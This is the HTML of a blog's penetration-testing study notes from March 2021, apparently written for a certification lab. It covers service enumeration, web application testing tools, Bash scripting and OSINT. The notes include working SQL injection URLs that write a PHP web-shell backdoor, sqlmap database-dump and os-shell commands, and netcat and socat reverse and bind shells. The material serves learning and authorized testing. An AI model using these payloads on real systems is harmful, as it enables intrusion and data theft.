<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.148.10&#x2F;debug.php?id&#x3D;1 union all select 1, 2, &quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into OUTFILE &#39;c:&#x2F;xampp&#x2F;htdocs&#x2F;backdoor2.php&#39;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.148.10&#x2F;debug.php?id&#x3D;1 union all select 1, 2, &quot;&lt;?php &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;&#x2F;pre&gt;&#39;;?&gt;&quot; into OUTFILE &#39;c:&#x2F;xampp&#x2F;htdocs&#x2F;backdoor4.php&#39;</span><br></pre></td></tr></table></figure>

<h2 id="Automating-sql-injection"><a href="#Automating-sql-injection" class="headerlink" title="Automating sql injection"></a>Automating sql injection</h2><p>sqlmap – not allowed in the exam<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot;</code><br>-p parameter to test  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1 AND 6836&#x3D;6836</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 4323 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(4323&#x3D;4323,1))),0x716b627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 1257 FROM (SELECT(SLEEP(5)))yDOk)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;1 UNION ALL SELECT NULL,CONCAT(0x7171767071,0x5a65795043747065446255675763434c564c48537750534f6d437859715570677765524e4552616a,0x716b627a71),NULL-- -</span><br></pre></td></tr></table></figure>

<p>automate the data extraction<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot; --dbms=mysql --dump</code></p>
<p>mysql and mariadb looks similar  </p>
<p>get os shell automatically:<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot; --dbms=mysql --os-shell</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/15/Study-Notes-2021-03-15/">Study Notes - 2021/03/15</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-15</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h1><p>port 111<br><code>nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254</code>  </p>
<h2 id="nmap-nfs-nse-script"><a href="#nmap-nfs-nse-script" class="headerlink" title="nmap nfs nse script"></a>nmap nfs nse script</h2><p><code>nmap -p 111 --script nfs* 10.11.1.72</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  &#x2F;home 10.11.0.0&#x2F;255.255.0.0</span><br></pre></td></tr></table></figure>
<p>mount it to our machine:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir home_72</span><br><span class="line">sudo mount -o nolock 10.11.1.72:&#x2F;home home_72</span><br></pre></td></tr></table></figure>
<p>-o nolock disable filelocking, need for old NFS servers</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x 2 nobody 4294967294 4096 Oct 27  2019 .</span><br><span class="line">drwxr-xr-x 7 root   root       4096 Sep 17  2015 ..</span><br><span class="line">-rwx------ 1 nobody 4294967294   48 Oct 27  2019 creds.txt</span><br></pre></td></tr></table></figure>
<p>shows nobody instead of userid, can not create a user id as guide shown  </p>
<h1 id="SMTP-enumeration"><a href="#SMTP-enumeration" class="headerlink" title="SMTP enumeration"></a>SMTP enumeration</h1><p>find existing users<br>port 25, udp   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 10.11.1.217 25</span><br><span class="line">VRFY idontexist</span><br></pre></td></tr></table></figure>
<h1 id="SNMP-Enumeration"><a href="#SNMP-Enumeration" class="headerlink" title="SNMP Enumeration"></a>SNMP Enumeration</h1><h2 id="SNMP-MIB-Tree"><a href="#SNMP-MIB-Tree" class="headerlink" title="SNMP MIB Tree"></a>SNMP MIB Tree</h2><h2 id="Scan-for-SNMP"><a href="#Scan-for-SNMP" class="headerlink" title="Scan for SNMP"></a>Scan for SNMP</h2><p><code>sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt</code><br>–open only display open ports<br><code>onesixtyone -c community -i ips</code><br><code>onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.119.133 </code>   </p>
<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>enumerating the entire MIB tree:<br><code>snmpwalk -c public -v1 -t 10 10.11.1.14</code><br>-v snmp version number<br>-t increase timeout to 10s  </p>
<h2 id="enumerating-windows-users"><a href="#enumerating-windows-users" class="headerlink" title="enumerating windows users"></a>enumerating windows users</h2><h2 id="enumerating-windows-processses"><a href="#enumerating-windows-processses" class="headerlink" title="enumerating windows processses"></a>enumerating windows processses</h2><h2 id="open-tcp-ports"><a href="#open-tcp-ports" class="headerlink" title="open tcp ports"></a>open tcp ports</h2><h2 id="software"><a href="#software" class="headerlink" title="software"></a>software</h2><h1 id="Vulnerability-Scanning"><a href="#Vulnerability-Scanning" class="headerlink" title="Vulnerability Scanning"></a>Vulnerability Scanning</h1><p>scanner with nessus<br>open in browser: <code>https://localhost:8834/</code>  </p>
<h2 id="Vul-scan-with-nmap"><a href="#Vul-scan-with-nmap" class="headerlink" title="Vul scan with nmap"></a>Vul scan with nmap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;</span><br><span class="line">head script.db</span><br><span class="line"># can grep this file</span><br><span class="line">sudo nmap --scriot vuln 10.11.1.10</span><br></pre></td></tr></table></figure>


<h1 id="Attack-web-application"><a href="#Attack-web-application" class="headerlink" title="Attack web application"></a>Attack web application</h1><p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project</a>  </p>
<ol>
<li>Injection</li>
<li>Broken Authentication</li>
<li>Sensitive Data Exposure</li>
<li>XML External Entities (XXE)</li>
<li>Broken Access Control </li>
<li>Security Misconfiguration</li>
<li>Cross-Site Scripting (XSS)</li>
<li>Insecure Deserialization</li>
<li>Using Components with Known Vulnerabilities</li>
<li>Insufficient Logging &amp; Monitoring</li>
</ol>
<h2 id="Web-application-Enueration"><a href="#Web-application-Enueration" class="headerlink" title="Web application Enueration"></a>Web application Enueration</h2><ul>
<li>Programming language and frameworks</li>
<li>Web server software</li>
<li>Database software</li>
<li>server OS </li>
</ul>
<h3 id="Inspecting-URLs"><a href="#Inspecting-URLs" class="headerlink" title="Inspecting URLs"></a>Inspecting URLs</h3><p>php<br>For example, a Java-based web application might use .jsp, .do, or .html.<br>concept of routes, map uri to a section of code</p>
<h3 id="Inspecting-Page-Content"><a href="#Inspecting-Page-Content" class="headerlink" title="Inspecting Page Content"></a>Inspecting Page Content</h3><p>Open Debugger, can pretty code content  </p>
<p>Right click -&gt; insepct Element  </p>
<p>View Response headers:  </p>
<ul>
<li>proxy </li>
<li>firefox network tool </li>
</ul>
<p>Server header somtimes reveal the server app and version number<br>Header start with <code>X-</code> are non-standard HTTP headers, can reveal additional info  </p>
<h3 id="Inspecting-sitemaps"><a href="#Inspecting-sitemaps" class="headerlink" title="Inspecting sitemaps"></a>Inspecting sitemaps</h3><p>most common site maps files:<br><code>robots.txt</code><br><code>sitemap.xml</code>  </p>
<h3 id="Locating-administration-consoles"><a href="#Locating-administration-consoles" class="headerlink" title="Locating administration consoles"></a>Locating administration consoles</h3><p>Two common examples are the manager application for Tomcat and phpMyAdmin for MySQL hosted at /manager/html and /phpmyadmin respectively.  </p>
<h2 id="Web-application-assessment-tools"><a href="#Web-application-assessment-tools" class="headerlink" title="Web application assessment tools"></a>Web application assessment tools</h2><h3 id="DIRB"><a href="#DIRB" class="headerlink" title="DIRB"></a>DIRB</h3><p>web content scanner, use wordlist.<br><code>dirb http://www.megacorpone.com -r -z 10</code><br>-r to scan non-recursively, and -z 10 to add a 10 millisecond delay to each request  </p>
<h3 id="Burp-suite"><a href="#Burp-suite" class="headerlink" title="Burp suite"></a>Burp suite</h3><p>foxyproxy firefox addon<br>add ca certificate for burpsuite<br>proxy-&gt;option-&gt;regenerate ca certificate<br>goto browser, enable proxy, open <a target="_blank" rel="noopener" href="http://burp/">http://burp</a>  -&gt; CA certificate to download crt file, import certificate<br>send to repeater, send single request  </p>
<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><p>webserver scanner  - not intend to stealth itself, send info in user-agent to identify itself<br>-maxtime<br>-T which types of tests  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host&#x3D;megacorpne.com -maxtime&#x3D;30s</span><br></pre></td></tr></table></figure>

<h2 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h2><h3 id="exploting-admin-consoles"><a href="#exploting-admin-consoles" class="headerlink" title="exploting admin consoles"></a>exploting admin consoles</h3><p>Windows client -&gt; XAMPP, start apache and mysql  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;10.11.0.22 -r</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.11.0.22&#x2F;phpmyadmin&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="Burp-intruder"><a href="#Burp-intruder" class="headerlink" title="Burp intruder"></a>Burp intruder</h3><p><code>&lt;input type=&quot;hidden&quot; name=&quot;set_session&quot; value=&quot;7r8oiuuoofdtcgc7ao731o0tcc&quot; /&gt;</code><br><code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;K&amp;amp;$&amp;amp;FR1\.cQ4)QW(&quot; /&gt;</code>  </p>
<p>send to intruder<br>select positions, type: Pitchfork, allowing us to set a unique payload list for each position.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/14/Study-Notes-2021-03-14/">Study Notes - 2021/03/14</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-14</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Practical-Tools"><a href="#Practical-Tools" class="headerlink" title="Practical Tools"></a>Practical Tools</h1><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><code>nc -nvlp 4444 -e /usr/bin/bash</code><br><code>nc -nv 192.168.xxx.xx 4444 -e /usr/bin/bash</code>  </p>
<p>Transfer file:<br><code>nc -nvlp 4444 &gt; incoming.txt</code><br><code>nc -nv xxx.xxx.xxx.xxx 4444 &lt; sendfile.txt</code></p>
<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><p><code>socat - TCP4:10.11.0.22:110</code><br><code>sudo socat TCP4-LISTEN:443 STDOUT</code><br><code>sudo socat TCP4-LISTEN:443,fork file:secret.txt</code><br><code>socat TCP4:localhost:443 file:receive.txt,create </code>  </p>
<h3 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h3><p><code>sudo socat -d -d TCP4-LISTEN:443 STDOUT</code><br><code>socat TCP4:localhost:443 EXEC:/bin/bash</code><br>-d -d increase verbose level two times  </p>
<h3 id="encrypted-bind-shells"><a href="#encrypted-bind-shells" class="headerlink" title="encrypted bind shells"></a>encrypted bind shells</h3><p>create certificate:<br><code>openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</code><br><code>cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</code><br><code>sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</code><br><code>socat - OPENSSL:localhost:443,verify=0</code>  </p>
<h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><p><code>Set-ExecutionPolicy Unrestricted</code></p>
<h2 id="file-transfer"><a href="#file-transfer" class="headerlink" title="file transfer"></a>file transfer</h2><p>…<br>Let me skip this  </p>
<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>catpure filter:<br><code>net 10.11.1.0/24</code><br>display filter:<br><code>tcp.port == 21</code><br>rightclick package-&gt;follow tcp stream  </p>
<h1 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h1><p><code>sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F&quot; &quot; &#39;&#123;print $5&#125;&#39; | sort | uniq -c | head</code>  </p>
<h1 id="Bash-Scripting"><a href="#Bash-Scripting" class="headerlink" title="Bash Scripting"></a>Bash Scripting</h1><h2 id="variable"><a href="#variable" class="headerlink" title="variable"></a>variable</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1&#x3D;hello</span><br><span class="line">echo $varq</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1&#x3D;&#39;hell world&#39;</span><br><span class="line">var1&#x3D;&quot;hello world&quot;</span><br></pre></td></tr></table></figure>
<p>for single quote: interprets every enclosed character literally<br>for double quote: excpet <code>$</code>, ```, and <code>\</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;$(whoami)</span><br><span class="line">user2&#x3D;&#96;whoami&#96;</span><br></pre></td></tr></table></figure>
<p><strong>command execute in a subshell</strong><br>$1, $2 …. arguments<br>$? The exit status of the most recently run process   </p>
<h2 id="Reading-user-input"><a href="#Reading-user-input" class="headerlink" title="Reading user input"></a>Reading user input</h2><p><code>read answer</code>  assign to answer variable<br>-p specify the prompt<br>-sp secret prompt  </p>
<h2 id="Conditions"><a href="#Conditions" class="headerlink" title="Conditions"></a>Conditions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if [ &lt;sometest&gt; ]</span><br><span class="line">then </span><br><span class="line">    &lt;statements&gt;</span><br><span class="line">elif [ &lt;condition&gt; ]</span><br><span class="line">then </span><br><span class="line">    &lt;statement&gt;</span><br><span class="line">else</span><br><span class="line">    &lt;statments&gt;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Operator Description: Expression True if…</span><br><span class="line">!EXPRESSION The EXPRESSION is false.</span><br><span class="line">-n STRING STRING length is greater than zero</span><br><span class="line">-z STRING The length of STRING is zero (empty)</span><br><span class="line">STRING1 !&#x3D; STRING2 STRING1 is not equal to STRING2</span><br><span class="line">STRING1 &#x3D; STRING2 STRING1 is equal to STRING2</span><br><span class="line">INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2</span><br><span class="line">INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2</span><br><span class="line">INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2</span><br><span class="line">INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2</span><br><span class="line">INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2</span><br><span class="line">INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2</span><br><span class="line">-d FILE FILE exists and is a directory</span><br><span class="line">-e FILE FILE exists</span><br><span class="line">-r FILE FILE exists and has read permission</span><br><span class="line">-s FILE FILE exists and it is not empty</span><br><span class="line">-w FILE FILE exists and has write permission</span><br><span class="line">-x FILE FILE exists and has execute permission</span><br></pre></td></tr></table></figure>

<p><code>cmd &amp;&amp; cmd2</code> execute cmd2 only if cmd return true/success<br><code>cmd || cmd2</code> execute if cmd fails  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if [ &lt;cond1&gt; ] &amp;&amp; [ &lt;cond2&gt; ]</span><br><span class="line">then</span><br><span class="line">    &lt;statement&gt;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h2 id="Loops"><a href="#Loops" class="headerlink" title="Loops:"></a>Loops:</h2><h3 id="For-loop"><a href="#For-loop" class="headerlink" title="For loop"></a>For loop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for var-name in &lt;list&gt;</span><br><span class="line">do</span><br><span class="line">    &lt;action&gt;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for ip in $(seq 1 10); do echo 10.11.1.$ip; done</span><br><span class="line">for i in &#123;1..10&#125;; do echo 10.11.1.$i;done</span><br></pre></td></tr></table></figure>

<h3 id="While-loops"><a href="#While-loops" class="headerlink" title="While loops"></a>While loops</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while [ &lt;some test&gt; ]</span><br><span class="line">do</span><br><span class="line">    &lt;perform an action&gt;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h2><p>``<br>function function_name {<br>echo “$1”<br>}</p>
<p>function_name () {<br>commands…<br>}</p>
<p>function_name $RANDOM</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**function must defined before get called**  </span><br><span class="line">### Return</span><br><span class="line">&#96;&#96;&#96; bash</span><br><span class="line">function1() &#123;</span><br><span class="line"> return $RANDOM   </span><br><span class="line">&#125;</span><br><span class="line">function1</span><br><span class="line">echo &quot;value returned is $?&quot;</span><br></pre></td></tr></table></figure>
<h3 id="local-variable"><a href="#local-variable" class="headerlink" title="local variable"></a>local variable</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name1=hello</span><br><span class="line">name2=name2</span><br><span class="line"><span class="function"><span class="title">func1</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> name1=world</span><br><span class="line">    name2=changed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Some-practical-usage"><a href="#Some-practical-usage" class="headerlink" title="Some practical usage"></a>Some practical usage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;href&#x3D;&quot; index.html | grep &quot;\.google&quot; | grep -v &quot;www\.google\.com&quot; | awk -F &quot;http:&#x2F;&#x2F;&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#x2F;&quot; -f 1</span><br><span class="line">grep -o &#39;[^&#x2F;]*\.google\.com&#39; index.html | sort -u &gt; list.txt</span><br><span class="line">for url in $(cat list.txt); do host $url; done | grep &quot;has address&quot; | cut -d &quot; &quot; -f 4 | sort -u</span><br></pre></td></tr></table></figure>
<p>[^/]* any char except ‘/‘</p>
<h2 id="Second-usage"><a href="#Second-usage" class="headerlink" title="Second usage:"></a>Second usage:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit afd windows -w -t</span><br><span class="line">searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>-w Show URLs to Exploit-DB.com rather than the local path  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot;);</span><br><span class="line">do exp_name&#x3D;$(echo $e | cut -d &quot;&#x2F;&quot; -f 5) &amp;&amp; url&#x3D;$(echo $e | sed &#39;s&#x2F;exploits&#x2F;raw&#x2F;&#39;) &amp;&amp;</span><br><span class="line">wget -q --no-check-certificate $url -O $exp_name; done</span><br></pre></td></tr></table></figure>
<p>-q quite mode  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"># Bash script to search for a given exploit and download all matches.</span><br><span class="line">for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot;)</span><br><span class="line">do</span><br><span class="line">exp_name&#x3D;$(echo $e | cut -d &quot;&#x2F;&quot; -f 5)</span><br><span class="line">url&#x3D;$(echo $e | sed &#39;s&#x2F;exploits&#x2F;raw&#x2F;&#39;)</span><br><span class="line">wget -q --no-check-certificate $url -O $exp_name</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="Third-usage"><a href="#Third-usage" class="headerlink" title="Third usage:"></a>Third usage:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -A -p80 --open 10.11.1.0&#x2F;24 -oG nmap-scan_10.11.1.1-254</span><br><span class="line"></span><br><span class="line">cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v &quot;Nmap&quot; | awk &#39;&#123;print $2&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>awk use space as delimiter  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v &quot;Nmap&quot; | awk &#39;&#123;print $2&#125;&#39;); do cutycapt --url&#x3D;$ip --out&#x3D;$ip.png;done</span><br></pre></td></tr></table></figure>
<p>cutycapt render the webpage</p>
<h1 id="Passive-Information-Gathering"><a href="#Passive-Information-Gathering" class="headerlink" title="Passive Information Gathering"></a>Passive Information Gathering</h1><p>Passive Information Gathering (also known as Open-source Intelligence or OSINT)  </p>
<ul>
<li>never communicate with the target directly </li>
</ul>
<h2 id="Website-Recon"><a href="#Website-Recon" class="headerlink" title="Website Recon"></a>Website Recon</h2><p>simply browsing the site </p>
<h2 id="Whois-enueration"><a href="#Whois-enueration" class="headerlink" title="Whois enueration"></a>Whois enueration</h2><p>whois google.com, can also look for ns<br>reverse lookup:<br><code>whois &lt;ip&gt;</code>  </p>
<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p><code>site:domanname.com filetype:php </code><br><code>site:domanname.com -filetyle:html</code><br><code>intitle:&quot;index of&quot; &quot;parent directory&quot;</code><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a>  </p>
<h2 id="netcraft"><a href="#netcraft" class="headerlink" title="netcraft"></a>netcraft</h2><p><a target="_blank" rel="noopener" href="https://www.netcraft.com/">https://www.netcraft.com/</a><br><a target="_blank" rel="noopener" href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com</a>  </p>
<h2 id="Recon-NG"><a href="#Recon-NG" class="headerlink" title="Recon-NG"></a>Recon-NG</h2><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><h2 id="Security-headers"><a href="#Security-headers" class="headerlink" title="Security headers"></a>Security headers</h2><p><a target="_blank" rel="noopener" href="https://securityheaders.com/">https://securityheaders.com/</a>   </p>
<h2 id="SSL-server-test"><a href="#SSL-server-test" class="headerlink" title="SSL server test"></a>SSL server test</h2><p><a target="_blank" rel="noopener" href="https://www.ssllabs.com/ssltest/">https://www.ssllabs.com/ssltest/</a><br>analyze ssl configurations  </p>
<p><a target="_blank" rel="noopener" href="https://pastebin.com/">https://pastebin.com/</a>  </p>
<h2 id="User-information-gathering"><a href="#User-information-gathering" class="headerlink" title="User information gathering"></a>User information gathering</h2><h3 id="Email-Harvesting"><a href="#Email-Harvesting" class="headerlink" title="Email Harvesting"></a>Email Harvesting</h3><p><code>theHarvester -d hello.com -b google</code></p>
<p><a target="_blank" rel="noopener" href="https://www.social-searcher.com/">https://www.social-searcher.com</a><br><a target="_blank" rel="noopener" href="https://digi.ninja/projects/twofi.php">https://digi.ninja/projects/twofi.php</a><br><a target="_blank" rel="noopener" href="https://github.com/initstring/linkedin2username">https://github.com/initstring/linkedin2username</a>  </p>
<h2 id="StackOverflow"><a href="#StackOverflow" class="headerlink" title="StackOverflow?"></a>StackOverflow?</h2><h2 id="Some-frameworks"><a href="#Some-frameworks" class="headerlink" title="Some frameworks"></a>Some frameworks</h2><p>OSINT Framework <a target="_blank" rel="noopener" href="https://osintframework.com/">https://osintframework.com/</a><br>Maltego <a target="_blank" rel="noopener" href="https://www.paterva.com/buy/maltego-clients.php">https://www.paterva.com/buy/maltego-clients.php</a>  </p>
<h1 id="Active-Information-Gathering"><a href="#Active-Information-Gathering" class="headerlink" title="Active Information Gathering"></a>Active Information Gathering</h1><h2 id="DNS-Enumeration"><a href="#DNS-Enumeration" class="headerlink" title="DNS Enumeration"></a>DNS Enumeration</h2><p><code>host www.google.ca</code><br><code>host -t mx www.google.ca</code>  </p>
